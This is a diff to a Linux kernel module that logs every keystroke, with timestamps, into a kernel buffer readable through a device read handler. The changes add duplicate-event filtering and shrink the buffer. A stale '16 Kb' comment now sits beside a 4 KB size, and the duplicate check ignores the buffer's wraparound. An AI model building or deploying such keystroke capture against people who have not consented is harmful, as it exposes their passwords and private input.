@@ -8,7 +8,9 @@
 #include <linux/input.h>
 #include <linux/slab.h>
 
-#define BUF_SIZE 4096 * 4 /* 16 Kb */
+#define BUF_SIZE 4096 /* 16 Kb */
+#define IGNORE_REPEAT
+// #define IGNORE_REPEAT_TIMESTAMP
 
 typedef struct {
     const char *name;
@@ -163,8 +165,6 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
     struct keyboard_notifier_param *param = data;
     char entry[128];
     int len;
-    static unsigned int last_keycode = 0;
-    static int last_keydown = -1;
 
     if (action == KBD_KEYCODE)
     {
@@ -180,15 +180,26 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
                        param->down ? "Pressed" : "Released");
 
         mutex_lock(&log_lock);
+#ifdef IGNORE_REPEAT
+        /* Will ignore the same key press event */
+        size_t timestamp_len = 8;
 
-        if (param->down == last_keydown && param->value == last_keycode)
+        if (log_end >= len && memcmp(log_buffer + log_end - len + timestamp_len,
+                                     entry + timestamp_len, len - timestamp_len) == 0)
         {
             mutex_unlock(&log_lock);
             return NOTIFY_OK;
         }
-
-        last_keycode = param->value;
-        last_keydown = param->down;
+#elif defined(IGNORE_REPEAT_TIMESTAMP)
+        /* Will accept the same key press event if it is repeated within the same second */
+        if (log_end >= len && memcmp(log_buffer + log_end - len, entry, len) == 0)
+        {
+            mutex_unlock(&log_lock);
+            return NOTIFY_OK;
+        }
+#else
+        /* Will accept the same key press event */
+#endif
 
         while ((log_end + len) % BUF_SIZE == log_start)
         {
@@ -210,10 +221,12 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
             }
             log_end = (log_end + len) % BUF_SIZE;
         }
+
         mutex_unlock(&log_lock);
     }
     return NOTIFY_OK;
 }
+
 
 static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
